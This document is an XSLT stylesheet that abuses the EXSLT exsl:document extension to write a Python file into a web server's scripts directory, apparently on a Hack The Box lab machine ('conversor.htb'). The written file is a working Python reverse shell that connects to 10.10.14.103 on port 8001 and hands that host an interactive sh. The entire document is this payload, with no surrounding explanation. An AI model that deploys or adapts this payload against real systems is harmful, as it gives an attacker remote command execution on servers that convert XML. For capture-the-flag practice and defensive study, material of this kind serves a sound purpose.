<?xml version="1.0" encoding="UTF-8"?> 
<xsl:stylesheet version="1.0" 
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
  xmlns:exsl="http://exslt.org/common" 
  extension-element-prefixes="exsl"> 
  <xsl:output method="html" encoding="UTF-8" /> 

  <xsl:template match="/"> 
    <exsl:document href="/var/www/conversor.htb/scripts/shell1.py" method="text" >
import socket,subprocess,os 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
s.connect(("10.10.14.103",8001)) 
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2) 
import pty; pty.spawn("sh") 
    </exsl:document> 
  </xsl:template> 
</xsl:stylesheet>
